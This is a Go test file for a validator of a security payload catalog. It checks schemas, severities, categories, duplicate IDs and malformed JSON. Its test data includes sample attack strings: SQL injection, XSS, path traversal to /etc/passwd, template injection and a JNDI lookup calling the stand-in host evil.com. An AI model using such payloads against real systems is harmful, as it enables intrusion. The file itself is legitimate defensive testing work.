package validate

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// TestValidationResultStruct tests ValidationResult JSON serialization
func TestValidationResultStruct(t *testing.T) {
	result := ValidationResult{
		TotalFiles:        5,
		TotalPayloads:     100,
		Errors:            []string{"error1", "error2"},
		Warnings:          []string{"warning1"},
		DuplicateIDs:      []string{"dup1"},
		MissingFields:     []string{"missing1"},
		InvalidSeverities: []string{"invalid1"},
		Valid:             false,
	}

	data, err := json.Marshal(result)
	if err != nil {
		t.Fatalf("failed to marshal: %v", err)
	}

	var restored ValidationResult
	if err := json.Unmarshal(data, &restored); err != nil {
		t.Fatalf("failed to unmarshal: %v", err)
	}

	if restored.TotalFiles != 5 {
		t.Errorf("expected TotalFiles 5, got %d", restored.TotalFiles)
	}
	if restored.TotalPayloads != 100 {
		t.Errorf("expected TotalPayloads 100, got %d", restored.TotalPayloads)
	}
	if len(restored.Errors) != 2 {
		t.Errorf("expected 2 errors, got %d", len(restored.Errors))
	}
	if restored.Valid != false {
		t.Error("expected Valid to be false")
	}
}

// TestPayloadSchema tests PayloadSchema JSON serialization
func TestPayloadSchema(t *testing.T) {
	schema := PayloadSchema{
		ID:            "test-001",
		Payload:       "' OR '1'='1",
		Category:      "Injection",
		SeverityHint:  "High",
		Tags:          []string{"sqli", "auth-bypass"},
		Notes:         "Classic SQL injection",
		Method:        "POST",
		Body:          `{"data": "test"}`,
		ExpectedBlock: true,
		Service:       "authentik",
		Endpoint:      "/api/login",
	}

	data, err := json.Marshal(schema)
	if err != nil {
		t.Fatalf("failed to marshal: %v", err)
	}

	var restored PayloadSchema
	if err := json.Unmarshal(data, &restored); err != nil {
		t.Fatalf("failed to unmarshal: %v", err)
	}

	if restored.ID != schema.ID {
		t.Errorf("ID mismatch: %s vs %s", restored.ID, schema.ID)
	}
	if restored.Category != schema.Category {
		t.Errorf("Category mismatch: %s vs %s", restored.Category, schema.Category)
	}
	if restored.ExpectedBlock != true {
		t.Error("ExpectedBlock should be true")
	}
}

// TestValidateSeverities tests the validSeverities map
func TestValidateSeverities(t *testing.T) {
	valid := []string{"Critical", "critical", "High", "high", "Medium", "medium", "Low", "low"}
	for _, sev := range valid {
		if !validSeverities[sev] {
			t.Errorf("expected %s to be valid severity", sev)
		}
	}

	invalid := []string{"CRITICAL", "info", "none", ""}
	for _, sev := range invalid {
		if validSeverities[sev] {
			t.Errorf("expected %s to be invalid severity", sev)
		}
	}
}

// TestValidateCategories tests the validCategories map
func TestValidateCategories(t *testing.T) {
	valid := []string{"injection", "xss", "traversal", "ssrf", "auth", "graphql"}
	for _, cat := range valid {
		if !validCategories[cat] {
			t.Errorf("expected %s to be valid category", cat)
		}
	}
}

// TestValidatePayloads tests the ValidatePayloads function
func TestValidatePayloads(t *testing.T) {
	t.Run("valid payloads", func(t *testing.T) {
		// Create a temp directory with valid payloads
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{"test-001": "test.json"}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Create valid payload file
		payloads := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "' OR '1'='1",
				"category":      "Injection",
				"severity_hint": "High",
				"tags":          []string{"sqli"},
				"notes":         "Test payload",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		result, err := ValidatePayloads(tmpDir, false, false)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !result.Valid {
			t.Errorf("expected valid result, got errors: %v", result.Errors)
		}
		if result.TotalPayloads != 1 {
			t.Errorf("expected 1 payload, got %d", result.TotalPayloads)
		}
	})

	t.Run("missing ids-map.json", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create payload file without ids-map.json
		payloads := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "Medium",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		if result.Valid {
			t.Error("expected invalid result due to missing ids-map.json")
		}
		if len(result.Errors) == 0 {
			t.Error("expected errors")
		}
	})

	t.Run("missing required field", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Payload missing 'id' field
		payloads := []map[string]interface{}{
			{
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "High",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		if result.Valid {
			t.Error("expected invalid result due to missing 'id' field")
		}
		if len(result.MissingFields) == 0 {
			t.Error("expected missing fields")
		}
	})

	t.Run("duplicate IDs", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// First file with id=test-001
		payloads1 := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "High",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData1, _ := json.Marshal(payloads1)
		os.WriteFile(filepath.Join(tmpDir, "file1.json"), payloadData1, 0644)

		// Second file with same id=test-001
		payloads2 := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test2",
				"category":      "Injection",
				"severity_hint": "Critical",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData2, _ := json.Marshal(payloads2)
		os.WriteFile(filepath.Join(tmpDir, "file2.json"), payloadData2, 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		if result.Valid {
			t.Error("expected invalid result due to duplicate IDs")
		}
		if len(result.DuplicateIDs) == 0 {
			t.Error("expected duplicate IDs")
		}
	})

	t.Run("invalid severity", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Payload with invalid severity
		payloads := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "SuperHigh", // Invalid
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		if result.Valid {
			t.Error("expected invalid result due to invalid severity")
		}
		if len(result.InvalidSeverities) == 0 {
			t.Error("expected invalid severities")
		}
	})

	t.Run("non-standard category warning", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Payload with non-standard category
		payloads := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test",
				"category":      "CustomCategory", // Non-standard
				"severity_hint": "High",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		// Should still be valid (warning only)
		if len(result.Warnings) == 0 {
			t.Error("expected warning for non-standard category")
		}
	})

	t.Run("invalid JSON", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Invalid JSON
		os.WriteFile(filepath.Join(tmpDir, "broken.json"), []byte("not valid json"), 0644)

		result, _ := ValidatePayloads(tmpDir, false, false)
		if result.Valid {
			t.Error("expected invalid result due to invalid JSON")
		}
	})

	t.Run("fail fast on error", func(t *testing.T) {
		tmpDir := t.TempDir()
		// No ids-map.json, should fail fast

		_, err := ValidatePayloads(tmpDir, true, false)
		if err == nil {
			t.Error("expected error with fail fast")
		}
	})

	t.Run("verbose mode", func(t *testing.T) {
		tmpDir := t.TempDir()

		// Create ids-map.json
		idsMap := map[string]string{}
		idsMapData, _ := json.Marshal(idsMap)
		os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

		// Create valid payload
		payloads := []map[string]interface{}{
			{
				"id":            "test-001",
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "Medium",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

		// Should not error in verbose mode
		result, err := ValidatePayloads(tmpDir, false, true)
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !result.Valid {
			t.Error("expected valid result")
		}
	})
}

// TestRequiredFields tests the requiredFields variable
func TestRequiredFields(t *testing.T) {
	expected := []string{"id", "payload", "category", "severity_hint", "tags", "notes"}
	if len(requiredFields) != len(expected) {
		t.Errorf("expected %d required fields, got %d", len(expected), len(requiredFields))
	}
	for _, f := range expected {
		found := false
		for _, rf := range requiredFields {
			if rf == f {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected %s to be a required field", f)
		}
	}
}

// TestInvalidIDsMapJSON tests invalid ids-map.json content
func TestInvalidIDsMapJSON(t *testing.T) {
	tmpDir := t.TempDir()

	// Create invalid ids-map.json
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), []byte("not valid json"), 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)
	if result.Valid {
		t.Error("expected invalid result due to invalid ids-map.json")
	}
}

// TestEmptyPayloadDirectory tests validation on empty directory
func TestEmptyPayloadDirectory(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMap := map[string]string{}
	idsMapData, _ := json.Marshal(idsMap)
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	result, err := ValidatePayloads(tmpDir, false, false)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.TotalPayloads != 0 {
		t.Errorf("expected 0 payloads, got %d", result.TotalPayloads)
	}
	if result.TotalFiles != 0 {
		t.Errorf("expected 0 files, got %d", result.TotalFiles)
	}
}

// TestNonExistentDirectory tests validation on non-existent directory
func TestNonExistentDirectory(t *testing.T) {
	_, err := ValidatePayloads("/nonexistent/path", false, false)
	if err == nil {
		// Some implementations might not error, but result should not be valid
		// This is acceptable - the directory just has no files
	}
}

// TestPayloadSchemaAllFields tests PayloadSchema with all fields
func TestPayloadSchemaAllFields(t *testing.T) {
	schema := PayloadSchema{
		ID:            "XSS-001",
		Payload:       "test-payload-value",
		Category:      "XSS",
		SeverityHint:  "High",
		Tags:          []string{"xss", "basic", "reflected"},
		Notes:         "Basic XSS payload",
		Method:        "GET",
		Body:          "",
		ExpectedBlock: true,
		Service:       "generic",
		Endpoint:      "/search",
	}

	// Serialize
	data, err := json.Marshal(schema)
	if err != nil {
		t.Fatalf("failed to marshal: %v", err)
	}

	// Check contains expected fields
	str := string(data)
	if !contains(str, "XSS-001") {
		t.Error("missing ID in JSON")
	}
	if !contains(str, "test-payload-value") {
		t.Error("missing payload in JSON")
	}
	if !contains(str, "expected_block") {
		t.Error("missing expected_block in JSON")
	}

	// Deserialize
	var restored PayloadSchema
	if err := json.Unmarshal(data, &restored); err != nil {
		t.Fatalf("failed to unmarshal: %v", err)
	}

	if len(restored.Tags) != 3 {
		t.Errorf("expected 3 tags, got %d", len(restored.Tags))
	}
}

// TestValidCategoriesList tests all valid categories
func TestValidCategoriesList(t *testing.T) {
	// All these should be valid (ValidCategories returns lowercase keys)
	categories := []string{
		"injection", "xss", "traversal", "ssrf", "auth", "protocol",
		"graphql", "cache", "logic", "deserialization", "fuzzing", "fuzz",
		"ai", "media", "ratelimit", "waf-validation", "waf-bypass",
		"regression", "owasp-top10", "obfuscation", "bypass",
		"service-specific", "upload",
	}

	for _, cat := range categories {
		if !validCategories[cat] {
			t.Errorf("expected %s to be a valid category", cat)
		}
	}
}

// TestAllSeverityLevels tests all valid severities
func TestAllSeverityLevels(t *testing.T) {
	severities := []string{"Critical", "critical", "High", "high", "Medium", "medium", "Low", "low"}
	for _, sev := range severities {
		if !validSeverities[sev] {
			t.Errorf("%s should be a valid severity", sev)
		}
	}
}

// TestVersionJsonExcluded tests that version.json is excluded from validation
func TestVersionJsonExcluded(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMap := map[string]string{}
	idsMapData, _ := json.Marshal(idsMap)
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create version.json (should be skipped)
	version := map[string]interface{}{"version": "1.0.0"}
	versionData, _ := json.Marshal(version)
	os.WriteFile(filepath.Join(tmpDir, "version.json"), versionData, 0644)

	// Create a valid payload file
	payloads := []map[string]interface{}{
		{
			"id":            "test-001",
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

	result, err := ValidatePayloads(tmpDir, false, false)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should only count test.json, not version.json or ids-map.json
	if result.TotalFiles != 1 {
		t.Errorf("expected 1 file (version.json should be excluded), got %d", result.TotalFiles)
	}
}

// Helper function
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// =============================================================================
// REAL BUG-FINDING TESTS - These tests verify actual behavior and find issues
// =============================================================================

// TestValidatorSeverityCaseSensitivityBug tests a potential bug:
// validSeverities has "Critical" and "critical" but NOT "CRITICAL"
func TestValidatorSeverityCaseSensitivityBug(t *testing.T) {
	// These are in the validSeverities map
	shouldPass := []string{"Critical", "critical", "High", "high", "Medium", "medium", "Low", "low"}

	// These are NOT in the map - potential user error
	shouldFail := []string{"CRITICAL", "HIGH", "MEDIUM", "LOW", "cRiTiCaL", "INFO", "None"}

	for _, sev := range shouldPass {
		if !validSeverities[sev] {
			t.Errorf("BUG: %q should be a valid severity but isn't", sev)
		}
	}

	for _, sev := range shouldFail {
		if validSeverities[sev] {
			t.Errorf("BUG: %q is accepted but shouldn't be (inconsistent case handling)", sev)
		}
	}

	// Document the limitation
	t.Logf("NOTE: Severity validation is case-sensitive and only accepts: Critical/critical, High/high, Medium/medium, Low/low")
	t.Logf("      Consider making validation case-insensitive using strings.ToLower")
}

// TestValidatorEmptyPayloadID tests what happens with empty ID string
func TestValidatorEmptyPayloadID(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create payload with EMPTY id field (present but empty)
	payloads := []map[string]interface{}{
		{
			"id":            "", // Empty string - BUG: should be rejected!
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// BUG: Empty ID string should NOT be valid!
	if result.Valid {
		t.Error("BUG: Empty ID string is being accepted - should be REJECTED")
	}
}

// TestValidatorDuplicateIDsAcrossFiles tests duplicate detection across files
func TestValidatorDuplicateIDsAcrossFiles(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create first file with ID
	payloads1 := []map[string]interface{}{
		{
			"id":            "duplicate-id",
			"payload":       "test1",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData1, _ := json.Marshal(payloads1)
	os.WriteFile(filepath.Join(tmpDir, "file1.json"), payloadData1, 0644)

	// Create second file with SAME ID
	payloads2 := []map[string]interface{}{
		{
			"id":            "duplicate-id", // Same ID!
			"payload":       "test2",
			"category":      "Injection",
			"severity_hint": "Critical",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData2, _ := json.Marshal(payloads2)
	os.WriteFile(filepath.Join(tmpDir, "file2.json"), payloadData2, 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// Should detect duplicate
	if result.Valid {
		t.Error("BUG: Validator should detect duplicate IDs across files")
	}
	if len(result.DuplicateIDs) == 0 {
		t.Error("BUG: Duplicate ID not detected")
	}
}

// TestValidatorMalformedJSONRecovery tests recovery from malformed JSON
func TestValidatorMalformedJSONRecovery(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create malformed JSON file
	os.WriteFile(filepath.Join(tmpDir, "bad.json"), []byte(`[{"id": "incomplete`), 0644)

	// Create valid file
	payloads := []map[string]interface{}{
		{
			"id":            "good-001",
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "good.json"), payloadData, 0644)

	result, err := ValidatePayloads(tmpDir, false, false)

	// Should continue validation after malformed file
	if err != nil {
		t.Errorf("Should continue after malformed JSON (failFast=false): %v", err)
	}

	// Should still count the good payloads
	if result.TotalPayloads != 1 {
		t.Errorf("Expected 1 payload from good.json, got %d", result.TotalPayloads)
	}

	// Should record error about bad.json
	if len(result.Errors) == 0 {
		t.Error("Should have recorded error for bad.json")
	}
}

// TestValidatorNullFieldValues tests handling of null JSON values
func TestValidatorNullFieldValues(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create payload with null values - common mistake
	jsonContent := `[{
		"id": "test-001",
		"payload": "test",
		"category": null,
		"severity_hint": "High",
		"tags": null,
		"notes": null
	}]`
	os.WriteFile(filepath.Join(tmpDir, "null-values.json"), []byte(jsonContent), 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// BUG: null values for required fields should be treated as missing
	if result.Valid {
		t.Error("BUG: Null value for category is being accepted - should be REJECTED")
	}
}

// TestValidatorUnicodeInPayloads tests handling of unicode characters
func TestValidatorUnicodeInPayloads(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create payload with unicode
	payloads := []map[string]interface{}{
		{
			"id":            "unicode-test-001",
			"payload":       "<script>alert('日本語')</script>",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{"unicode", "日本語"},
			"notes":         "Test with unicode payload 🎯",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "unicode.json"), payloadData, 0644)

	result, err := ValidatePayloads(tmpDir, false, false)
	if err != nil {
		t.Errorf("Should handle unicode: %v", err)
	}
	if !result.Valid {
		t.Errorf("Unicode payloads should be valid: %v", result.Errors)
	}
}

// TestValidatorVeryLongID tests handling of extremely long IDs
func TestValidatorVeryLongID(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create a VERY long ID (10KB)
	longID := ""
	for i := 0; i < 10000; i++ {
		longID += "x"
	}

	payloads := []map[string]interface{}{
		{
			"id":            longID,
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "long-id.json"), payloadData, 0644)

	result, err := ValidatePayloads(tmpDir, false, false)
	if err != nil {
		t.Fatalf("Error: %v", err)
	}

	// BUG: Very long IDs (10KB) should NOT be valid!
	if result.Valid {
		t.Error("BUG: Very long ID (10KB) is being accepted - should be REJECTED (max ~256 chars)")
	}
}

// TestValidatorIDWhitespaceHandling tests ID whitespace handling
func TestValidatorIDWhitespaceHandling(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create payloads with whitespace IDs
	payloads := []map[string]interface{}{
		{
			"id":            "  spaces  ", // Leading/trailing spaces
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
		{
			"id":            "tabs\there", // Tabs in ID
			"payload":       "test2",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "whitespace.json"), payloadData, 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// BUG: Whitespace in IDs should NOT be valid!
	if result.Valid {
		t.Error("BUG: IDs with leading/trailing whitespace or tabs are being accepted - should be REJECTED")
	}
}

// TestValidatorNonArrayJSON tests handling of JSON that's not an array
func TestValidatorNonArrayJSON(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Write a JSON object (not array)
	jsonContent := `{"id": "test-001", "payload": "test", "category": "XSS"}`
	os.WriteFile(filepath.Join(tmpDir, "object.json"), []byte(jsonContent), 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// Should detect and report this as an error
	if result.Valid {
		t.Error("BUG: JSON object instead of array should be rejected")
	}
	if len(result.Errors) == 0 {
		t.Error("BUG: Should report error for non-array JSON")
	}
}

// TestValidatorFailFastBehavior tests that failFast actually stops early
func TestValidatorFailFastBehavior(t *testing.T) {
	tmpDir := t.TempDir()

	// DON'T create ids-map.json - this should trigger first error

	// Create multiple files - with failFast, shouldn't reach them all
	for i := 0; i < 10; i++ {
		payloads := []map[string]interface{}{
			{
				"id":            "", // Invalid - missing ID
				"payload":       "test",
				"category":      "XSS",
				"severity_hint": "High",
				"tags":          []string{},
				"notes":         "",
			},
		}
		payloadData, _ := json.Marshal(payloads)
		filename := filepath.Join(tmpDir, fmt.Sprintf("test%d.json", i))
		os.WriteFile(filename, payloadData, 0644)
	}

	result, err := ValidatePayloads(tmpDir, true, false) // failFast=true

	// Should have stopped at first error
	if err == nil {
		t.Logf("NOTE: failFast=true returned nil error even though there should be errors")
	}

	// Should have reported fewer errors than if we continued
	t.Logf("Errors with failFast: %d (should be 1 or 2)", len(result.Errors))
}

// TestValidatorConcurrentReads simulates concurrent validation
func TestValidatorConcurrentReads(t *testing.T) {
	tmpDir := t.TempDir()

	// Create ids-map.json
	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	// Create valid payload file
	payloads := []map[string]interface{}{
		{
			"id":            "test-001",
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "test.json"), payloadData, 0644)

	// Run validation concurrently
	var wg sync.WaitGroup
	errors := make(chan error, 10)

	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := ValidatePayloads(tmpDir, false, false)
			if err != nil {
				errors <- err
			}
		}()
	}

	wg.Wait()
	close(errors)

	for err := range errors {
		t.Errorf("Concurrent validation error: %v", err)
	}
}

// ── Negative tests: category validation ───────────────────────────────────

func TestValidatorRejectsUnregisteredCategory(t *testing.T) {
	tmpDir := t.TempDir()

	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	payloads := []map[string]interface{}{
		{
			"id":            "neg-001",
			"payload":       "<script>alert(1)</script>",
			"category":      "Totally-Fake-Category",
			"severity_hint": "High",
			"tags":          []string{"fake"},
			"notes":         "negative test",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "fake.json"), payloadData, 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	// Unregistered categories produce warnings (not errors — existing behavior).
	if len(result.Warnings) == 0 {
		t.Error("expected warning for unregistered category 'Totally-Fake-Category'")
	}
	found := false
	for _, w := range result.Warnings {
		if strings.Contains(w, "Totally-Fake-Category") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("warning list %v does not mention 'Totally-Fake-Category'", result.Warnings)
	}
}

func TestValidatorAdversarialCategories(t *testing.T) {
	tmpDir := t.TempDir()

	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	adversarial := []string{
		"<script>alert(1)</script>",
		"'; DROP TABLE categories;--",
		"../../etc/passwd",
		"${jndi:ldap://evil.com}",
		"{{.Exec}}",
		strings.Repeat("A", 10000),
	}

	var payloads []map[string]interface{}
	for i, cat := range adversarial {
		payloads = append(payloads, map[string]interface{}{
			"id":            fmt.Sprintf("adv-%03d", i),
			"payload":       "test",
			"category":      cat,
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "adversarial category test",
		})
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "adversarial.json"), payloadData, 0644)

	// Must not panic — graceful handling is the requirement.
	result, _ := ValidatePayloads(tmpDir, false, false)

	// Each adversarial category should produce a warning.
	if len(result.Warnings) < len(adversarial) {
		t.Errorf("expected >= %d warnings for adversarial categories, got %d",
			len(adversarial), len(result.Warnings))
	}
}

func TestValidatorEmptyCategory(t *testing.T) {
	tmpDir := t.TempDir()

	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	payloads := []map[string]interface{}{
		{
			"id":            "empty-cat-001",
			"payload":       "test",
			"category":      "",
			"severity_hint": "High",
			"tags":          []string{},
			"notes":         "empty category test",
		},
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "emptycat.json"), payloadData, 0644)

	// Must not panic.
	result, _ := ValidatePayloads(tmpDir, false, false)

	// Empty category should produce a warning (the validator lowercases and looks up).
	if len(result.Warnings) == 0 {
		t.Error("expected warning for empty category")
	}
}

func TestValidatorInvalidSeverityValues(t *testing.T) {
	tmpDir := t.TempDir()

	idsMapData, _ := json.Marshal(map[string]string{})
	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)

	badSeverities := []string{
		"",
		"CRITICAL", // wrong case (currently only Critical)
		"Negligible",
		"Super-High",
		"<script>",
		strings.Repeat("A", 1000),
	}

	var payloads []map[string]interface{}
	for i, sev := range badSeverities {
		payloads = append(payloads, map[string]interface{}{
			"id":            fmt.Sprintf("badsev-%03d", i),
			"payload":       "test",
			"category":      "XSS",
			"severity_hint": sev,
			"tags":          []string{},
			"notes":         "bad severity test",
		})
	}
	payloadData, _ := json.Marshal(payloads)
	os.WriteFile(filepath.Join(tmpDir, "badsev.json"), payloadData, 0644)

	result, _ := ValidatePayloads(tmpDir, false, false)

	if result.Valid {
		t.Error("payloads with invalid severities should make result invalid")
	}
	// Skip checking "" since it may evaluate differently (empty string in JSON).
	// But at least the non-empty bad severities that aren't in [Critical,High,Medium,Low]
	// should be flagged.
	if len(result.InvalidSeverities) < 3 {
		t.Errorf("expected >= 3 invalid severities, got %d: %v",
			len(result.InvalidSeverities), result.InvalidSeverities)
	}
}

func TestValidCategoriesRejectsGarbage(t *testing.T) {
	garbage := []string{
		"not-a-real-category",
		"<script>",
		"'; DROP TABLE--",
		"",
		"   ",
		"\x00",
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
	}

	for _, g := range garbage {
		if validCategories[g] {
			t.Errorf("validCategories should not contain garbage input %q", g)
		}
	}
}
